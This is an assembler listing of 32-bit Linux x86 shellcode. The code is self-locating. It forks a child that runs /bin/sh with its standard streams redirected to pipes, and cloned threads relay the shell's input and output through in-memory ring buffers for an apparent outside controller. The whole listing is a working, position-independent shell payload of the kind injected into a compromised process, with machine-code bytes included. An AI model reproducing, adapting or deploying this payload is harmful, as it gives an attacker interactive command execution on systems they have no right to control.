     1                                  BITS 32
     2                                  
     3                                  ;		     #   1   2   3   4   5   6
     4                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
     5                                  ; syscall return: EAX
     6                                  
     7                                  ;
     8                                  ; http://www.lxhp.in-berlin.de/lhpsyscal.html
     9                                  ;
    10                                  ; all necessary system calls:
    11                                  ; ===========================
    12                                  ;
    13                                  ; clone:	eax: 120
    14                                  ; 		ebx: clone-flags
    15                                  ; 		ecx: ptr to top of (distinct) stack space
    16                                  ; 		edx: ptr to pt_regs or NULL
    17                                  ;
    18                                  ; close:	eax: 6
    19                                  ; 		ebx: fd to close
    20                                  ;
    21                                  ; dup2:	eax: 63
    22                                  ; 		ebx: fd 2 dup
    23                                  ; 		ecx: fd to assign the dup to
    24                                  ;
    25                                  ; execve:	eax: 11
    26                                  ; 		ebx: ptr to string of program path&name
    27                                  ; 		ecx: ptr to argv[]
    28                                  ; 		edx: ptr to envv[]
    29                                  ;
    30                                  ; exit:	eax: 1
    31                                  ; 		ebx: exit code
    32                                  ;
    33                                  ; fcntl:	eax: 55
    34                                  ; 		ebx: fd
    35                                  ; 		ecx: command code
    36                                  ; 		edx: file locks: ptr to writable struct flock
    37                                  ;
    38                                  ; fork:	eax: 2
    39                                  ; 		ebx... are passed to forked process.
    40                                  ;
    41                                  ; kill:	eax: 37
    42                                  ; 		ebx: pid (?)
    43                                  ; 		ecx: signal (?)
    44                                  ; 		SIGKILL = 9
    45                                  ;
    46                                  ; nanosleep:	eax: 162
    47                                  ; 		ebx: ptr to struct timespec
    48                                  ; 		ecx: ptr to alterable struct timespec
    49                                  ;
    50                                  ; read:	eax: 3
    51                                  ; 		ebx: fd
    52                                  ; 		ecx: ptr to buffer
    53                                  ; 		edx: count
    54                                  ;
    55                                  ; write:	eax: 4
    56                                  ; 		ebx: fd
    57                                  ; 		ecx: ptr to buffer
    58                                  ; 		edx: count
    59                                  ;
    60                                  ; pipe:	eax: 42
    61                                  ; 		ebx: ptr to dword[2]
    62                                  ;
    63                                  
    64                                  start:
    65 00000000 E800000000              	call near shcode_start
    66                                  shcode_start:
    67 00000005 5D                      	pop	ebp
    68 00000006 81C50A020000            	add	ebp, data_start - shcode_start
    69                                  
    70                                  	; pipe(m2sh)
    71 0000000C 31C0                    	xor	eax,eax
    72 0000000E B02A                    	mov	al,42
    73 00000010 89EB                    	mov	ebx,ebp
    74 00000012 81C315000000            	add	ebx,m2sh_0
    75 00000018 CD80                    	int	0x80
    76                                  
    77 0000001A 3D00000000              	cmp	eax,0
    78 0000001F 7524                    	jne	child_dead_interleaved
    79                                  
    80                                  	; pipe(sh2m)
    81 00000021 31C0                    	xor	eax,eax
    82 00000023 B02A                    	mov	al,42
    83 00000025 89EB                    	mov	ebx,ebp
    84 00000027 81C31D000000            	add	ebx,sh2m_0
    85 0000002D CD80                    	int	0x80
    86                                  
    87 0000002F 3D00000000              	cmp	eax,0
    88 00000034 750F                    	jne	child_dead_interleaved
    89                                  
    90                                  	; fork()
    91 00000036 31C0                    	xor	eax,eax
    92 00000038 B002                    	mov	al,2
    93 0000003A CD80                    	int	0x80
    94                                  
    95 0000003C 3D00000000              	cmp	eax,0
    96 00000041 7407                    	je	child
    97 00000043 7F5B                    	jg	parent			; signed compare
    98                                  child_dead_interleaved:
    99 00000045 E98D010000              	jmp	child_dead
   100                                  
   101                                  child:
   102                                  	; dup2(m2sh[0], 0)   (dup to stdin)
   103 0000004A 31C0                    	xor	eax,eax
   104 0000004C B03F                    	mov	al,63
   105 0000004E 8B9D15000000            	mov	ebx,[ebp+m2sh_0]
   106 00000054 31C9                    	xor	ecx,ecx
   107 00000056 CD80                    	int	0x80
   108                                  
   109 00000058 39C8                    	cmp	eax,ecx
   110 0000005A 753F                    	jne	leave_sh_interleaved
   111                                  
   112                                  	; dup2(sh2m[1], 1)   (dup to stdout)
   113 0000005C 31C0                    	xor	eax,eax
   114 0000005E B03F                    	mov	al,63
   115 00000060 8B9D21000000            	mov	ebx,[ebp+sh2m_1]
   116 00000066 41                      	inc	ecx
   117 00000067 CD80                    	int	0x80
   118                                  
   119 00000069 39C8                    	cmp	eax,ecx
   120 0000006B 752E                    	jne	leave_sh_interleaved
   121                                  %ifndef OPTIMIZE_FOR_SIZE_HARD
   122                                  	; dup2(sh2m[1], 2)   (dup to stderr)
   123 0000006D 31C0                    	xor	eax,eax
   124 0000006F B03F                    	mov	al,63
   125                                  ;	mov	ebx,[ebp+sh2m_1]
   126 00000071 41                      	inc	ecx
   127 00000072 CD80                    	int	0x80
   128                                  
   129 00000074 39C8                    	cmp	eax,ecx
   130 00000076 7523                    	jne	leave_sh_interleaved
   131                                  %endif
   132                                  
   133                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
   134 00000078 31C0                    	xor	eax,eax
   135 0000007A B00B                    	mov	al,11
   136 0000007C 89EB                    	mov	ebx,ebp
   137 0000007E 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
   138                                  
   139 00000084 89E9                    	mov	ecx,ebp
   140 00000086 81C125020000            	add	ecx,foo				; ecx -> foo
   141                                  
   142 0000008C 31D2                    	xor	edx,edx
   143 0000008E 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
   144 00000090 895104                  	mov	[ecx+4],edx			; bar := NULL
   145 00000093 89CA                    	mov	edx,ecx
   146 00000095 42                      	inc	edx
   147 00000096 42                      	inc	edx
   148 00000097 42                      	inc	edx
   149 00000098 42                      	inc	edx				; edx -> bar
   150 00000099 CD80                    	int	0x80
   151                                  
   152                                  	; fail if execve did not work.
   153                                  leave_sh_interleaved:
   154 0000009B E968010000              	jmp	leave_sh
   155                                  
   156                                  parent:
   157                                  	; remember child's PID
   158 000000A0 898511000000            	mov	[ebp+child_pid],eax
   159                                  
   160                                  %ifndef OPTIMIZE_FOR_SIZE_HARD
   161                                  	; close(m2sh[0])
   162 000000A6 31C0                    	xor	eax,eax
   163 000000A8 B006                    	mov	al,6
   164 000000AA 8B9D15000000            	mov	ebx,[ebp+m2sh_0]
   165 000000B0 CD80                    	int	0x80
   166                                  
   167                                  	; close(sh2m[1])
   168 000000B2 31C0                    	xor	eax,eax
   169 000000B4 B006                    	mov	al,6
   170 000000B6 8B9D21000000            	mov	ebx,[ebp+sh2m_1]
   171 000000BC CD80                    	int	0x80
   172                                  %endif
   173                                  
   174                                  	; clone:
   175                                  	; one thread for reader, one thread for writer
   176 000000BE 31C0                    	xor	eax,eax
   177 000000C0 B078                    	mov	al,120
   178                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   179                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   180                                  	; CLONE_PTRACE = 0x00002000
   181 000000C2 BB000F0100              	mov	ebx,0x00010f00
   182 000000C7 89E1                    	mov	ecx,esp	; just use same stack with a delta of 64
   183 000000C9 81EC40000000            	sub	esp,64 ; we need the stack only a tiny bit.
   184 000000CF 31D2                    	xor	edx,edx
   185 000000D1 CD80                    	int	0x80
   186                                  
   187 000000D3 3D00000000              	cmp	eax,0
   188                                  	; ret=0 -> clone
   189 000000D8 7407                    	je	thread_write_to_master_interleaved	; clone is writer
   190                                  	; ret>0 -> original
   191 000000DA 7F0A                    	jg	thread_read_from_master			; original is reader
   192                                  	; error if ret<0
   193 000000DC E9F6000000              	jmp	child_dead
   194                                  
   195                                  thread_write_to_master_interleaved:
   196 000000E1 E984000000              	jmp	thread_write_to_master
   197                                  
   198                                  	; ==================================== the READER thread:
   199                                  thread_read_from_master:
   200                                  	; will write to child via m2sh[1]
   201                                  	; remember RINGBUFFER from_master in esi
   202 000000E6 89EE                    	mov	esi,ebp
   203 000000E8 81C625000000            	add	esi,rfrm_buffer
   204                                  
   205                                  reader_while_fds_ok:
   206                                  	; while both FDs are ok:
   207 000000EE 8A8503000000            	mov	al,[ebp+to_child_ok]
   208 000000F4 028504000000            	add	al,[ebp+from_child_ok]
   209 000000FA 3C02                    	cmp	al,2
   210 000000FC 753D                    	jne	leave_sh_second_interleaved
   211                                  
   212                                  	; test, if master requested child to be terminated
   213 000000FE 8A8502000000            	mov	al,[ebp+terminate_child]
   214 00000104 3C00                    	cmp	al,0
   215 00000106 753F                    	jne	do_terminate_child
   216                                  
   217                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
   218 00000108 31C0                    	xor	eax,eax
   219 0000010A 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
   220 00000110 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
   221 00000116 3C00                    	cmp	al,0
   222 00000118 7426                    	je	reader_sleep
   223                                  
   224                                  	; EAX/AL is the number of bytes to be written to the child.
   225                                  
   226                                  	; write a single byte to the child.
   227 0000011A 31C0                    	xor	eax,eax
   228 0000011C B004                    	mov	al,4
   229 0000011E 8B9D19000000            	mov	ebx,[ebp+m2sh_1]	; EBX := m2sh[1]
   230 00000124 31C9                    	xor	ecx,ecx
   231 00000126 8A8D06000000            	mov	cl,[ebp+rfrm_reader_pos]
   232 0000012C 01F1                    	add	ecx,esi			; ECX := reader_pos + buffer_base
   233 0000012E 31D2                    	xor	edx,edx
   234 00000130 42                      	inc	edx			; EDX := 1
   235 00000131 CD80                    	int	0x80
   236                                  
   237                                  	; mark chunk as read
   238 00000133 009506000000            	add	[ebp+rfrm_reader_pos], dl
   239 00000139 EBB3                    	jmp	reader_while_fds_ok
   240                                  
   241                                  leave_sh_second_interleaved:
   242 0000013B E9C8000000              	jmp	leave_sh
   243                                  
   244                                  reader_sleep:
   245 00000140 E875000000              	call	sleep_short
   246 00000145 EBA7                    	jmp	reader_while_fds_ok
   247                                  
   248                                  do_terminate_child:
   249                                  	; send a SIGKILL to child
   250 00000147 31C0                    	xor	eax,eax
   251 00000149 B025                    	mov	al,37
   252 0000014B 8B9D11000000            	mov	ebx,[ebp+child_pid]
   253 00000151 31C9                    	xor	ecx,ecx
   254 00000153 B109                    	mov	cl,9	; SIGKILL
   255 00000155 CD80                    	int	0x80
   256                                  
   257                                  	; clear to_child_ok
   258 00000157 31C0                    	xor	eax,eax
   259 00000159 898503000000            	mov	[ebp+to_child_ok], eax
   260                                  	; and from_child_ok
   261 0000015F 898504000000            	mov	[ebp+from_child_ok], eax
   262 00000165 E99E000000              	jmp	leave_sh
   263                                  
   264                                  	; ==================================== the WRITER thread:
   265                                  thread_write_to_master:
   266                                  	; will read from child via sh2m[0]
   267                                  	; remember RINGBUFFER to_master in esi
   268 0000016A 89EE                    	mov	esi,ebp
   269 0000016C 81C625010000            	add	esi,rto_buffer
   270                                  
   271                                  writer_while_fds_ok:
   272                                  	; while both FDs are ok:
   273 00000172 8A8503000000            	mov	al,[ebp+to_child_ok]
   274 00000178 028504000000            	add	al,[ebp+from_child_ok]
   275 0000017E 3C02                    	cmp	al,2
   276 00000180 7555                    	jne	child_dead
   277                                  
   278                                  	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
   279 00000182 8A8507000000            	mov	al,[ebp+rto_writer_pos]
   280 00000188 FEC0                    	inc	al
   281 0000018A 2A8508000000            	sub	al,[ebp+rto_reader_pos]
   282 00000190 7421                    	jz	writer_sleep
   283                                  
   284                                  	; read ONE SINGLE BYTE and pass it into the buffer.
   285 00000192 31C0                    	xor	eax,eax
   286 00000194 B003                    	mov	al,3
   287 00000196 8B9D1D000000            	mov	ebx,[ebp+sh2m_0]
   288 0000019C 31C9                    	xor	ecx,ecx
   289 0000019E 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
   290 000001A4 01F1                    	add	ecx,esi
   291 000001A6 31D2                    	xor	edx,edx
   292 000001A8 42                      	inc	edx
   293 000001A9 CD80                    	int	0x80
   294                                  
   295 000001AB FE8507000000            	inc byte [ebp+rto_writer_pos]
   296                                  
   297                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
   298                                  	; read() will block if there is no data from child.
   299 000001B1 EBBF                    	jmp	writer_while_fds_ok
   300                                  
   301                                  writer_sleep:
   302 000001B3 E802000000              	call	sleep_short
   303 000001B8 EBB8                    	jmp	writer_while_fds_ok
   304                                  
   305                                  	; ==================================================================
   306                                  
   307                                  sleep_short:
   308                                  	; sleep 0.001 seconds:
   309                                  	; usleep(0,1000000);
   310 000001BA 31C0                    	xor	eax,eax
   311 000001BC B0A2                    	mov	al, 162
   312 000001BE 89EB                    	mov	ebx, ebp
   313 000001C0 81C325020000            	add	ebx, foo
   314 000001C6 89D9                    	mov	ecx, ebx
   315 000001C8 31D2                    	xor	edx,edx
   316 000001CA 8913                    	mov long [ebx], edx		; seconds
   317 000001CC BAA0860100              	mov	edx,100000
   318 000001D1 895304                  	mov long [ebx+4], edx		; nanoseconds
   319 000001D4 CD80                    	int	0x80
   320                                  
   321 000001D6 C3                      	ret
   322                                  
   323                                  child_dead:
   324                                  	; at most wait 2 seconds for master's ACK
   325 000001D7 31C0                    	xor	eax,eax
   326 000001D9 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   327 000001DF 7527                    	jne	leave_sh
   328 000001E1 B002                    	mov	al,2
   329 000001E3 388500000000            	cmp	[ebp+child_is_dead], al
   330 000001E9 771D                    	ja	leave_sh
   331                                  
   332 000001EB FE4500                  	inc byte [ebp]
   333                                  
   334                                  	; usleep(1,0):
   335 000001EE 31C0                    	xor	eax,eax
   336 000001F0 B0A2                    	mov	al, 162
   337 000001F2 89EB                    	mov	ebx, ebp
   338 000001F4 81C325020000            	add	ebx, foo
   339 000001FA 89D9                    	mov	ecx, ebx
   340 000001FC 31D2                    	xor	edx,edx
   341 000001FE 895304                  	mov long [ebx+4], edx		; nanoseconds
   342 00000201 42                      	inc	edx
   343 00000202 8913                    	mov long [ebx], edx		; seconds
   344 00000204 CD80                    	int	0x80
   345                                  
   346 00000206 EBCF                    	jmp	child_dead
   347                                  
   348                                  leave_sh:
   349                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   350 00000208 31C0                    	xor	eax,eax
   351 0000020A 89C3                    	mov	ebx,eax
   352 0000020C 40                      	inc	eax
   353 0000020D CD80                    	int	0x80
   354                                  
   355                                  ; =============================================================================
   356                                  ; DATA
   357                                  data_start EQU $
   358                                  
   359                                  ; do not change order of the following stuff!
   360                                  
   361                                  child_is_dead EQU $ - data_start
   362 0000020F 00                      	db		0
   363                                  child_is_dead_ACK EQU $ - data_start
   364 00000210 00                      	db		0
   365                                  
   366                                  terminate_child	EQU $ - data_start
   367 00000211 00                      	db		0
   368                                  
   369                                  to_child_ok EQU $ - data_start
   370 00000212 01                      	db		1
   371                                  from_child_ok EQU $ - data_start
   372 00000213 01                      	db		1
   373                                  
   374                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
   375                                  ; a ringbuffer is FULL, if _reader == _writer+1
   376                                  
   377                                  ; ringbuffer from_master:
   378                                  
   379                                  rfrm_writer_pos EQU $ - data_start
   380 00000214 00                      	db		0
   381                                  rfrm_reader_pos EQU $ - data_start
   382 00000215 00                      	db		0
   383                                  
   384                                  ; ringbuffer to_master:
   385                                  
   386                                  rto_writer_pos EQU $ - data_start
   387 00000216 00                      	db		0
   388                                  rto_reader_pos EQU $ - data_start
   389 00000217 00                      	db		0
   390                                  
   391                                  execve_command EQU $ - data_start
   392 00000218 2F62696E2F736800        	db	'/bin/sh',0
   393                                  
   394                                  ; =============================================================================
   395                                  ; stuff that is not required to be initialized:
   396                                  align 4
   397                                  
   398                                  ;child_pid EQU $ - data_start
   399                                  ;	dd	0
   400                                  ;m2sh_0 EQU $ - data_start
   401                                  ;	dd	0
   402                                  ;m2sh_1 EQU $ - data_start
   403                                  ;	dd	0
   404                                  ;sh2m_0 EQU $ - data_start
   405                                  ;	dd	0
   406                                  ;sh2m_1 EQU $ - data_start
   407                                  ;	dd	0
   408                                  ;
   409                                  ;rfrm_buffer EQU $ - data_start
   410                                  ;	resb	256
   411                                  ;rto_buffer EQU $ - data_start
   412                                  ;	resb	256
   413                                  ;
   414                                  ;align 4
   415                                  ;
   416                                  ;foo EQU $ - data_start
   417                                  ;	dd	0
   418                                  ;bar EQU $ - data_start
   419                                  ;	dd	0
   420                                  
   421                                  child_pid EQU $ - data_start
   422                                  
   423                                  ; pipes middleman<->shell
   424                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   425                                  m2sh_1 EQU $ - data_start + 8			; master writes
   426                                  sh2m_0 EQU $ - data_start + 12			; master reads
   427                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   428                                  
   429                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   430                                  rto_buffer EQU $ - data_start + 276		; TO master
   431                                  
   432                                  foo EQU $ - data_start + 532
   433                                  bar EQU $ - data_start + 536
   434                                  
